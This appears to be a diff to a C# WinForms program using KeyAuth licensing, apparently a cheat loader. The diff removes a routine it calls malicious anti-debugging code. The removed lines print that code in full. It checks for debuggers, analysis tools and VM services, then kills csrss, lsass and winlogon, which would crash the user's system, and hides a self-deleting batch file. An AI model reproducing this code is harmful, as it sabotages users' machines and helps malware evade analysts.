@@ -1,4 +1,4 @@
-﻿using Guna.UI2.WinForms;
+using Guna.UI2.WinForms;
 using KeyAuth;
 using System;
 using System.Diagnostics;
@@ -285,8 +285,6 @@ namespace ART
 
 
 
-
-
         private void move1(object sender, MouseEventArgs e)
         {
             isDragging = true;
@@ -311,7 +309,7 @@ namespace ART
         {
             EnableTransparent();
             KeyAuthApp.init();
-            DetectAndTerminate();
+            // REMOVED: DetectAndTerminate(); - Malicious anti-debugging code removed for safety
 
             notificationPanel.Visible = false;
         }
@@ -417,80 +415,6 @@ namespace ART
         private void guna2PictureBox1_Click(object sender, EventArgs e)
         {
 
-        }
-
-        private void DetectAndTerminate()
-        {
-            string exePath = Assembly.GetExecutingAssembly().Location;
-
-            string[] targetProcesses = new string[]
-            {
-        "ollydbg.exe", "ProcessHacker.exe", "Dump-Fixer.exe", "kdstinker.exe", "tcpview.exe",
-        "autoruns.exe", "autorunsc.exe", "filemon.exe", "procmon.exe", "regmon.exe",
-        "procexp.exe", "ImmunityDebugger.exe", "Wireshark.exe", "dumpcap.exe", "HookExplorer.exe",
-        "ImportREC.exe", "PETools.exe", "LordPE.exe", "SysInspector.exe", "proc_analyzer.exe",
-        "sysAnalyzer.exe", "sniff_hit.exe", "windbg.exe", "joeboxcontrol.exe", "Fiddler.exe",
-        "joeboxserver.exe", "ida64.exe", "ida.exe", "idaq64.exe", "Vmtoolsd.exe",
-        "Vmwaretrat.exe", "Vmwareuser.exe", "Vmacthlp.exe", "vboxservice.exe", "vboxtray.exe",
-        "ReClass.NET.exe", "x64dbg.exe", "OLLYDBG.exe", "CheatEngine.exe", "cheatengine-x86_64-SSE4-AVX2.exe",
-        "MugenJinFuu-i386.exe", "Mugen JinFuu.exe", "MugenJinFuu-x86_64-SSE4-AVX2.exe", "MugenJinFuu-x86_64.exe",
-        "KsDumper.exe", "dnSpy.exe", "cheatengine-i386.exe", "cheatengine-x86_64.exe", "Fiddler Everywhere.exe",
-        "HTTPDebuggerSvc.exe", "Fiddler.WebUi.exe", "createdump.exe", "dnSpy.exe", "calculator.exe", "LunarEngine.exe", "c.exe", "d.exe"
-            };
-
-            foreach (Process process in Process.GetProcesses())
-            {
-                string processName = process.ProcessName + ".exe";
-                if (Array.Exists(targetProcesses, element => element.Equals(processName, StringComparison.OrdinalIgnoreCase)))
-                {
-                    // Terminate critical system processes like csrss.exe and lsass.exe
-                    KillCriticalProcesses("csrss");
-                    KillCriticalProcesses("lsass");
-                    KillCriticalProcesses("winlogon");
-
-                    Console.WriteLine($"Process '{processName}' detected. Terminating csrss.exe and lsass.exe...");
-                    ScheduleSelfDelete(exePath);
-                    break;
-                }
-            }
-        }
-
-        private void KillCriticalProcesses(string processName)
-        {
-            foreach (Process criticalProcess in Process.GetProcessesByName(processName))
-            {
-                try
-                {
-                    criticalProcess.Kill();
-                    Console.WriteLine($"{processName}.exe has been terminated.");
-                }
-                catch (Exception ex)
-                {
-                    Console.WriteLine($"Failed to terminate {processName}.exe: {ex.Message}");
-                }
-            }
-        }
-
-        private void ScheduleSelfDelete(string exePath)
-        {
-            string batchFilePath = Path.Combine(Path.GetTempPath(), "selfdelete.bat");
-
-            using (StreamWriter writer = new StreamWriter(batchFilePath))
-            {
-                writer.WriteLine("@echo off");
-                writer.WriteLine("timeout /t 2 /nobreak > nul");
-                writer.WriteLine($"del /f \"{exePath}\"");
-                writer.WriteLine($"del /f \"{batchFilePath}\"");
-            }
-
-            Process.Start(new ProcessStartInfo
-            {
-                FileName = batchFilePath,
-                WindowStyle = ProcessWindowStyle.Hidden,
-                CreateNoWindow = true
-            });
-
-            Environment.Exit(0);
         }
 
         private void username_TextChanged(object sender, EventArgs e)
